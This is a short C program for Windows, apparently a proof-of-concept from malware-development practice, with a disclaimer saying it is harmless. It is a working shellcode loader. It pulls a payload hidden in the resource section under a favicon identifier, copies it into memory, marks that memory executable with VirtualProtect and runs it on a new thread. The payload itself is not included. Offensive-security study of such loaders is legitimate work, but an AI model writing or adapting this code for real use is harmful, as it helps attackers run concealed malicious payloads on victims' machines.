/**
 * Creator:    VPR
 * Created:    November 21, 2021
 * Updated:    March 20th, 2025
 *
 * Disclaimer:
 *     This program was designed as a proof-of-concept. It doesn't do anything
 *     malicious and it is not intended to do so. Don't try to use it for any
 *     malicious or illegal activity.
**/

#include "resources.h"

#include <windows.h>

#include <stdlib.h>
#include <stdio.h>

int main(void)
{
    void* exec_mem;
    BOOL rv;
    HRSRC res;
    HANDLE th;
    DWORD old_protect;

    // Extract payload from resources section
    res = FindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    HGLOBAL hRes = LoadResource(NULL, res);

    // Create payload
    unsigned char* payload = (unsigned char *)LockResource(hRes);
    size_t payload_size = SizeofResource(NULL, res);

    // Allocate a memory buffer for payload
    exec_mem = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    printf("Payload address: 0x%-16p\n", (void *)payload);
    printf("Payload size: %lld\n", payload_size);
    printf("Executable memory address: 0x%-16p\n", (void *)exec_mem);

    // Copy payload to a new memory buffer and make it executable
    RtlMoveMemory(exec_mem, payload, payload_size);
    rv = VirtualProtect(exec_mem, payload_size, PAGE_EXECUTE_READ, &old_protect);

    system("pause");

    if (rv)
    {
        th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
        CloseHandle(th);
    }
    VirtualProtect(exec_mem, payload_size, old_protect, &old_protect);

    return 0;
}
